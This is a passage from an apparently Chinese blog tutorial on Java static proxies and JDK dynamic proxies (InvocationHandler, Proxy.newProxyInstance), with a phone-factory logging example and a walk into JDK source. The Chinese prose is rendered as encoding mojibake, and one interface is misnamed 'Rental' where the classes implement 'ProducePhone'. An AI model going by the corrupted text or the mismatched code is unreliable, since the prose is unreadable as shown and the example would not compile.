é™æ€ä»£ç†</h3><p>å…ˆæ¥çœ‹ä¸ªDemo</p><p>æ¯”å¦‚æœ‰ä¸€ä¸ªæ‰‹æœºå·¥å‚ï¼Œç°åœ¨æœ‰ç”Ÿäº§æ‰‹æœºè¿™é¡¹å·¥ä½œï¼Œå¹¶ä¸”éœ€è¦åœ¨æ‰‹æœºç”Ÿäº§å‰åè®°å½•ä¸€ä¸‹æ—¥å¿—ã€‚æ­¤æ—¶ç”Ÿäº§æ‰‹æœºæ˜¯ä½œä¸ºä¸»è¦èŒè´£ï¼Œè®°å½•æ—¥å¿—ç®—æ˜¯ç”Ÿäº§æ‰‹æœºçš„é¢å¤–å·¥ä½œã€‚ç°åœ¨å¯ä»¥å°†è¿™ä¸¤é¡¹å·¥ä½œè¿›è¡Œåˆ†ç¦»ï¼Œç”Ÿäº§æ‰‹æœºè¿˜æ˜¯åœ¨<code>ProducePhoneImp</code>ä¸­ï¼Œè®°å½•æ—¥å¿—äº¤ç»™ä¸€ä¸ªä»£ç†ç±»<code>ProducePhoneProxy</code>å»è¿›è¡Œ</p><p>åœ¨è¿™é‡Œå…ˆçœ‹ä¸€ä¸‹ä¸¤ä¸ªåè¯ï¼š</p><p><strong>å§”æ‰˜ç±»</strong>ï¼šå®ç°äº†å…·ä½“<strong>ä¸»é¢˜æ¥å£çš„ç±»</strong>ï¼Œå®ƒæ˜¯è¢«ä»£ç†å¯¹è±¡çš„çœŸæ­£å®ç°ç±»ã€‚å§”æ‰˜ç±»çš„ä¸»è¦èŒè´£æ˜¯å®ç°æŠ½è±¡ä¸»é¢˜æ¥å£æ‰€å®šä¹‰çš„æ–¹æ³•ï¼Œå¹¶å®Œæˆ<strong>å…·ä½“çš„ä¸šåŠ¡é€»è¾‘</strong>ã€‚ï¼ˆä¾‹å¦‚ä¸Šé¢ä¾‹å­ä¸­çš„ç”Ÿäº§æ‰‹æœºï¼‰</p><p><strong>ä»£ç†ç±»</strong>ï¼šå®ç°äº†æŠ½è±¡ä¸»é¢˜æ¥å£çš„ç±»ï¼Œå®ƒæŒæœ‰ä¸€ä¸ªå¯¹å…·ä½“ä¸»é¢˜å¯¹è±¡çš„å¼•ç”¨ã€‚ä»£ç†ç±»çš„ä¸»è¦èŒè´£æ˜¯æ§åˆ¶å¯¹å…·ä½“ä¸»é¢˜å¯¹è±¡çš„è®¿é—®ï¼Œå¹¶åœ¨å¿…è¦çš„æƒ…å†µä¸‹æä¾›ä¸€äº›é¢å¤–çš„åŠŸèƒ½ï¼Œå¦‚è®°å½•æ—¥å¿—ã€è®¡ç®—æ‰§è¡Œæ—¶é—´ã€ç¼“å­˜ç­‰ã€‚ï¼ˆä¾‹å¦‚ä¸Šé¢çš„ä¾‹å­ä¸­çš„è®°å½•æ—¥å¿—ï¼‰</p><p>åœ¨ä»£ç†æ¨¡å¼ä¸­ï¼Œå§”æ‰˜ç±»å’Œä»£ç†ç±»æ˜¯åˆ†ç¦»çš„ï¼Œ<strong>å§”æ‰˜ç±»ä¸“æ³¨äºå®Œæˆå…·ä½“çš„ä¸šåŠ¡</strong>ï¼Œè€Œ<strong>ä»£ç†ç±»è´Ÿè´£æ§åˆ¶å¯¹å§”æ‰˜ç±»çš„è®¿é—®</strong>ï¼Œå¹¶åœ¨å¿…è¦æ—¶æä¾›ä¸€äº›é¢å¤–çš„åŠŸèƒ½ã€‚</p><p>OKï¼Œæ¥çœ‹ä¾‹å­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä¸»é¢˜ï¼šç”Ÿäº§æ‰‹æœºï¼Œå…ˆå®šä¹‰ä¸ªæ¥å£ï¼Œå§”æ‰˜ç±»å’Œä»£ç†ç±»éƒ½éœ€è¦å®ç°è¯¥æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Rental</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç”Ÿäº§æ‰‹æœº</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">producePhone</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å§”æ‰˜ç±»,ç”¨äºå®ç°ä¸»é¢˜çš„ä¸šåŠ¡é€»è¾‘</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProducePhoneImp</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ProducePhone</span></span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">producePhone</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰‹æœºç”Ÿäº§ä¸­...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ä»£ç†ç±»ï¼šæ§åˆ¶å¯¹å§”æ‰˜ç±»çš„è®¿é—®ï¼Œå¹¶åœ¨å¿…è¦æ—¶æä¾›ä¸€äº›é¢å¤–çš„åŠŸèƒ½</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProducePhoneProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ProducePhone</span></span>&#123;<br>    <span class="hljs-keyword">private</span> ProducePhone producePhoneImp;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProducePhoneProxy</span><span class="hljs-params">(ProducePhone producePhoneImp)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.producePhoneImp = producePhoneImp;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">producePhone</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ—¥å¿—è®°å½•--&gt;å¼€å§‹ç”Ÿäº§æ‰‹æœº...&quot;</span>);<br>        producePhoneImp.producePhone();<span class="hljs-comment">// ç”±ä»£ç†ç±»æ¥è°ƒç”¨å§”æ‰˜ç±»çš„å…·ä½“å®ç°</span><br>        System.out.println(<span class="hljs-string">&quot;æ—¥å¿—è®°å½•--&gt;æ‰‹æœºç”Ÿäº§ç»“æŸ...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/1.png"></p><p>è¿™é‡Œå°±ç®€å•çš„å®Œæˆäº†ä¸€ä¸ªé™æ€ä»£ç†çš„demoï¼Œå¾ˆå®¹æ˜“ç†è§£ï¼Œä½†é™æ€æœ‰å¾ˆå¤§çš„ç¼ºé™·ï¼Œä¾‹å¦‚ï¼š</p><ol><li>é™æ€ä»£ç†å®ç°ç±»å¿…é¡»ä¸è¢«ä»£ç†ç±»<strong>å®ç°åŒä¸€ä¸ªæ¥å£</strong>ï¼Œå¦‚æœéœ€è¦ä»£ç†çš„ç±»<strong>æ²¡æœ‰å®ç°ä»»ä½•æ¥å£</strong>ï¼Œå°±ä¸èƒ½ä½¿ç”¨é™æ€ä»£ç†ã€‚</li><li><strong>æ¯ä¸ªè¢«ä»£ç†çš„æ–¹æ³•åœ¨ä»£ç†ç±»ä¸­éƒ½è¦è¿›è¡Œå®šä¹‰</strong>ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä»£ç†ç±»éå¸¸è‡ƒè‚¿ï¼Œè€Œä¸”å¦‚æœéœ€è¦ä»£ç†çš„æ–¹æ³•è¿‡å¤šï¼Œå¼€å‘å·¥ä½œé‡ä¼šéå¸¸å¤§ã€‚</li><li>é™æ€ä»£ç†åªèƒ½ä¸ºç‰¹å®šçš„æ¥å£ï¼ˆæˆ–ç±»ï¼‰è¿›è¡Œä»£ç†ï¼Œè¿™æ„å‘³ç€å¦‚æœéœ€è¦ä»£ç†çš„æ¥å£ï¼ˆæˆ–ç±»ï¼‰å¢åŠ æˆ–è€…ä¿®æ”¹ï¼Œå°±éœ€è¦ä¿®æ”¹ä»£ç†ç±»çš„ä»£ç ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä»£ç†ç±»çš„<strong>å¯ç»´æŠ¤æ€§å˜å·®</strong>ã€‚</li><li><strong>é™æ€ä»£ç†åªèƒ½ä»£ç†å›ºå®šçš„ä¸€ä¸ªç±»</strong>ï¼Œå¦‚æœéœ€è¦ä»£ç†å¤šä¸ªç±»æˆ–è€…ä»£ç†ç±»çš„ç±»å‹åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šï¼Œå°±éœ€è¦ä½¿ç”¨åŠ¨æ€ä»£ç†ã€‚</li></ol><p>é™æ€ä»£ç†çš„é™åˆ¶è¾ƒå¤šï¼Œæ•…æ¥çœ‹ä¸‹åŠ¨æ€ä»£ç†</p><h3 id="0x02-åŠ¨æ€ä»£ç†"><a href="#0x02-åŠ¨æ€ä»£ç†" class="headerlink" title="0x02 åŠ¨æ€ä»£ç†"></a>0x02 åŠ¨æ€ä»£ç†</h3><p>JavaåŠ¨æ€ä»£ç†ä¸»è¦åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼šåŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†å’ŒåŸºäºç±»çš„åŠ¨æ€ä»£ç†ã€‚æ­¤å¤„é‡ç‚¹æ¥çœ‹åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†ï¼Œè¿™é‡Œæ˜¯jdkå®ç°çš„ã€‚åŸºäºç±»çš„åŠ¨æ€ä»£ç†éœ€è¦å¼•å…¥ç¬¬ä¸‰æ–¹çš„åº“ã€‚ä¾‹å¦‚ï¼šCGLIBï¼ˆCode Generation Libraryï¼‰ã€‚</p><h4 id="åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†"><a href="#åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†" class="headerlink" title="åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†"></a>åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†</h4><p>å…ˆçœ‹ä¸€ä¸‹å®ç°åŠ¨æ€ä»£ç†çš„æ­¥éª¤ï¼š</p><ol><li>å®šä¹‰ä¸€ä¸ªå§”æ‰˜ç±»ï¼Œå¹¶å®ç°ä¸€ä¸ªæ¥å£ï¼Œè¯¥æ¥å£æ˜¯ä»£ç†æ¥å£çš„è¶…æ¥å£ã€‚</li><li>å®ç°<code>InvocationHandler</code>æ¥å£ï¼Œè¯¥æ¥å£åŒ…å«äº†ä¸€ä¸ª<code>invoke</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•ç”¨äºåœ¨ä»£ç†å¯¹è±¡çš„æ–¹æ³•è¢«è°ƒç”¨æ—¶å®ç°å¯¹æ–¹æ³•çš„å¢å¼ºå¤„ç†ã€‚</li><li>ä½¿ç”¨<code>Proxy</code>ç±»çš„<code>newProxyInstance</code>æ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œè¯¥æ–¹æ³•çš„ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä¸ºï¼šä»£ç†ç±»çš„ç±»åŠ è½½å™¨ã€ä»£ç†æ¥å£æ•°ç»„ã€<code>InvocationHandler</code>å¯¹è±¡ã€‚</li><li>ä½¿ç”¨ä»£ç†å¯¹è±¡è°ƒç”¨æ–¹æ³•ã€‚</li></ol><p>åŸºäºä¸Šé¢çš„ä¾‹å­å’Œæ­¥éª¤ï¼Œå…ˆæ¥ä¸ªdemo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// æ¥å£ç±»</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProducePhone</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç”Ÿäº§æ‰‹æœº</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">producePhone</span><span class="hljs-params">()</span></span>;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è´¨é‡æ£€æŸ¥</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">qualityTesting</span><span class="hljs-params">()</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å§”æ‰˜ç±»ï¼šå®ç°æ¥å£</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProducePhoneImp</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ProducePhone</span> </span>&#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">producePhone</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰‹æœºç”Ÿäº§ä¸­...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">qualityTesting</span><span class="hljs-params">()</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ‰‹æœºè´¨é‡æ£€æŸ¥ä¸­...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// åŠ¨æ€ä»£ç†ç±»:éœ€è¦å®ç°InvocationHandlerï¼Œå¹¶ä¸”é‡å†™invoke()</span><br><span class="hljs-comment">// åœ¨invoke()ä¸­ï¼Œå®ç°å¯¹å§”æ‰˜ç±»ä¸­çš„æ–¹æ³•å¢åŠ æˆ–åŠŸèƒ½å¢åŠ </span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProducePhoneProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">InvocationHandler</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> Object obj;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ProducePhoneProxy</span><span class="hljs-params">(Object obj)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.obj = obj;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>        Object result = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;producePhone&quot;</span>.equals(method.getName()))&#123;<br>            System.out.println(<span class="hljs-string">&quot;æ—¥å¿—è®°å½•--&gt;å¼€å§‹ç”Ÿäº§æ‰‹æœº...&quot;</span>);<br>            result = method.invoke(obj, args);<br>            System.out.println(<span class="hljs-string">&quot;æ—¥å¿—è®°å½•--&gt;æ‰‹æœºç”Ÿäº§ç»“æŸ...&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-string">&quot;qualityTesting&quot;</span>.equals(method.getName()))&#123;<br>            System.out.println(<span class="hljs-string">&quot;æ—¥å¿—è®°å½•--&gt;å¼€å§‹è´¨é‡æ£€æŸ¥...&quot;</span>);<br>            result = method.invoke(obj, args);<br>            System.out.println(<span class="hljs-string">&quot;æ—¥å¿—è®°å½•--&gt;ç»“æŸè´¨é‡æ£€æŸ¥...&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/2.png"></p><p>OKï¼Œdemoå®Œæˆï¼Œå†æ¥çœ‹ä¸€ä¸‹å…·ä½“æ˜¯æ€ä¹ˆä¸ªå›äº‹å§</p><h5 id="InvocationHandleræ¥å£"><a href="#InvocationHandleræ¥å£" class="headerlink" title="InvocationHandleræ¥å£"></a><code>InvocationHandler</code>æ¥å£</h5><p>ç”¨äºå®šä¹‰ä»£ç†ç±»çš„è°ƒç”¨å¤„ç†ç¨‹åºçš„æ¥å£ã€‚è¿™ä¸ªæ¥å£å…¶å®æ²¡å•¥ï¼Œåªéœ€è¦è®°ä½ä½¿ç”¨åŸºäºæ¥å£çš„åŠ¨æ€ä»£ç†æ—¶ï¼ŒåŠ¨æ€ä»£ç†ç±»éœ€è¦å®ç°æ”¹æ¥å£ï¼Œå¹¶é‡å†™<code>invoke()</code>ï¼Œé‡ç‚¹æ˜¯<code>invoke()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">invoke</span><span class="hljs-params">(Object proxy, Method method, Object[] args)</span> <span class="hljs-keyword">throws</span> Throwable</span>;<br><span class="hljs-comment">// proxy:è°ƒç”¨è¯¥æ–¹æ³•çš„ä»£ç†å®ä¾‹</span><br><span class="hljs-comment">// method:å¯¹åº”äºè°ƒç”¨ä»£ç†å®ä¾‹ä¸Šçš„æ¥å£æ–¹æ³•çš„å®ä¾‹.æ–¹æ³•å¯¹è±¡çš„å£°æ˜ç±»å°†æ˜¯è¯¥æ–¹æ³•å£°æ˜çš„æ¥å£ï¼Œå®ƒå¯ä»¥æ˜¯ä»£ç†ç±»ç»§æ‰¿è¯¥æ–¹æ³•çš„ä»£ç†æ¥å£çš„è¶…çº§æ¥å£ã€‚ </span><br><span class="hljs-comment">// args:åŒ…å«çš„æ–¹æ³•è°ƒç”¨ä¼ é€’ä»£ç†å®ä¾‹çš„å‚æ•°å€¼çš„å¯¹è±¡çš„é˜µåˆ—ï¼Œæˆ–nullå¦‚æœæ¥å£æ–¹æ³•æ²¡æœ‰å‚æ•°</span><br><span class="hljs-comment">// return:ä»ä»£ç†å®ä¾‹ä¸Šçš„æ–¹æ³•è°ƒç”¨è¿”å›çš„å€¼(å…¶å®è¿”å›å€¼ä¹Ÿå°±ç›¸å½“äºæ˜¯å®ŒæˆåŠŸèƒ½å¢å¼ºåçš„ä»£ç†ç±»çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒé™æ€ä»£ç†è‡ªå·±å†™çš„å¢å¼ºæ–¹æ³•)ã€‚å¦‚æœæ¥å£æ–¹æ³•çš„å£°æ˜è¿”å›ç±»å‹æ˜¯åŸå§‹ç±»å‹ï¼Œåˆ™æ­¤æ–¹æ³•è¿”å›çš„å€¼å¿…é¡»æ˜¯å¯¹åº”çš„åŸºæœ¬åŒ…è£…ç±»çš„å®ä¾‹; å¦åˆ™ï¼Œå®ƒå¿…é¡»æ˜¯å¯å£°æ˜è¿”å›ç±»å‹çš„ç±»å‹ã€‚ å¦‚æœæ­¤æ–¹æ³•è¿”å›çš„å€¼æ˜¯nullå’Œæ¥å£æ–¹æ³•çš„è¿”å›ç±»å‹æ˜¯åŸºæœ¬ç±»å‹ï¼Œé‚£ä¹ˆNullPointerExceptionå°†ç”±ä»£ç†å®ä¾‹çš„æ–¹æ³•è°ƒç”¨æŠ›å‡ºã€‚ å¦‚ä¸Šæ‰€è¿°ï¼Œå¦‚æœæ­¤æ–¹æ³•è¿”å›çš„å€¼ï¼Œå¦åˆ™ä¸ä¼šä¸æ¥å£æ–¹æ³•çš„å£°æ˜çš„è¿”å›ç±»å‹å…¼å®¹ï¼Œä¸€ä¸ªClassCastExceptionå°†ä»£ç†å®ä¾‹çš„æ–¹æ³•è°ƒç”¨å°†æŠ›å‡ºã€‚</span><br></code></pre></td></tr></table></figure><h5 id="Proxyç±»"><a href="#Proxyç±»" class="headerlink" title="Proxyç±»"></a>Proxyç±»</h5><p>ç”¨äºåˆ›å»ºä»£ç†å®ä¾‹çš„ç±»ã€‚çœ‹èµ·æ¥ä¸œè¥¿ä¹Ÿä¸å¤šğŸ¤£ï¼Œä½†å¥½åƒç•¥æœ‰äº›å°éš¾</p><p><img src="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/3.png"></p><p>é‡ç‚¹å…³æ³¨çš„è¿˜æ˜¯åŠ¨æ€ä»£ç†ç±»çš„å®ç°ï¼Œä¹Ÿå°±æ˜¯<code>newProxyInstance</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// loader:ç”¨äºåŠ è½½ä»£ç†ç±»çš„ç±»åŠ è½½å™¨ã€‚</span><br><span class="hljs-comment">// interfaces:ä»£ç†ç±»éœ€è¦å®ç°çš„æ¥å£åˆ—è¡¨ã€‚</span><br><span class="hljs-comment">// h:è°ƒç”¨å¤„ç†å™¨ï¼Œç”¨äºä»£ç†ç±»æ–¹æ³•çš„è°ƒç”¨ï¼Œæ­¤å¤„å…¶å®ä¹Ÿå°±æ˜¯æˆ‘ä»¬å®šä¹‰çš„ä»£ç†ç±»(å®ç°InvocationHandleræ¥å£çš„ä»£ç†ç±»)</span><br><span class="hljs-meta">@CallerSensitive</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="hljs-params"><span class="hljs-function">                                          InvocationHandler h)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> IllegalArgumentException</span>&#123;<br>        ...<br>    &#125;<br><span class="hljs-comment">// return:è¿”å›ä¸€ä¸ªä»£ç†ç±»å®ä¾‹ï¼Œè¯¥å®ä¾‹å®ç°äº†æŒ‡å®šçš„æ¥å£ï¼Œå…¶æ–¹æ³•è°ƒç”¨ä¼šè¢«è½¬å‘åˆ°InvocationHandlerçš„invokeæ–¹æ³•ä¸­ã€‚åœ¨invokeæ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰å¯¹ä»£ç†å¯¹è±¡æ–¹æ³•çš„è°ƒç”¨è¿›è¡Œæ§åˆ¶å’Œå¢å¼ºã€‚</span><br></code></pre></td></tr></table></figure><p>OKï¼Œæ¥çœ‹ä¸€ä¸‹åŠ¨æ€ä»£ç†ç±»çš„ç”Ÿæˆï¼Œå…ˆäº†è§£ä¸€ä¸‹åŠ¨æ€ä»£ç†ç±»çš„å‘½åï¼šä»¥$Proxyä¸ºå‰ç¼€ï¼Œåé¢è·Ÿä¸Šä¸€ä¸²æ•°å­—ï¼Œè¡¨ç¤ºä»£ç†ç±»çš„åºå·ã€‚è¿™æ˜¯å› ä¸ºä¸€ä¸ªæ¥å£å¯èƒ½ä¼šæœ‰å¤šä¸ªä»£ç†ç±»å®ç°ï¼Œæ¯ä¸ªä»£ç†ç±»å®ç°éƒ½ä¼šæœ‰ä¸€ä¸ªå”¯ä¸€çš„åºå·ã€‚ä¹Ÿå°±æ˜¯<code>ä»£ç†ç±»å…¨ç±»å</code>+<code>$Proxy</code>+<code>åºå·</code></p><p>ç›´æ¥è·Ÿè¿›<code>newProxyInstance()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      Class&lt;?&gt;[] interfaces,</span></span><br><span class="hljs-params"><span class="hljs-function">                                      InvocationHandler h)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> IllegalArgumentException</span><br><span class="hljs-function"></span>&#123;<br>    Objects.requireNonNull(h);<span class="hljs-comment">// åˆ¤æ–­è°ƒç”¨å¤„ç†å™¨æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºåˆ™å¯„</span><br><br>    <span class="hljs-keyword">final</span> Class&lt;?&gt;[] intfs = interfaces.clone();<span class="hljs-comment">// å¯¹è±¡æ‹·è´,ä¿æŠ¤interfacesæ•°ç»„çš„å†…å®¹ä¸å—åˆ°ä¿®æ”¹ã€‚</span><br>    <span class="hljs-keyword">final</span> SecurityManager sm = System.getSecurityManager();<span class="hljs-comment">// å®‰å…¨æ£€æŸ¥</span><br>    <span class="hljs-keyword">if</span> (sm != <span class="hljs-keyword">null</span>) &#123;<br>        checkProxyAccess(Reflection.getCallerClass(), loader, intfs);<br>    &#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Look up or generate the designated proxy class.ä»ç¼“å­˜ä¸­æŸ¥æ‰¾æ‰¾å·²ç”Ÿæˆçš„ä»£ç†ç±»æˆ–ç”Ÿæˆä»£ç†ç±»</span><br><span class="hljs-comment">     */</span><br>    Class&lt;?&gt; cl = getProxyClass0(loader, intfs);<span class="hljs-comment">// è·Ÿè¿›ï¼Œæ­¤å¤„å°±å·²ç»ç”Ÿæˆäº†ä»£ç†å¯¹è±¡</span><br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * Invoke its constructor with the designated invocation handler.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (sm != <span class="hljs-keyword">null</span>) &#123;<br>                checkNewProxyPermission(Reflection.getCallerClass(), cl);<br>            &#125;<br><br>            <span class="hljs-keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);<br>            <span class="hljs-keyword">final</span> InvocationHandler ih = h;<br>            <span class="hljs-keyword">if</span> (!Modifier.isPublic(cl.getModifiers())) &#123;<br>                AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;<br>                    <span class="hljs-function"><span class="hljs-keyword">public</span> Void <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                    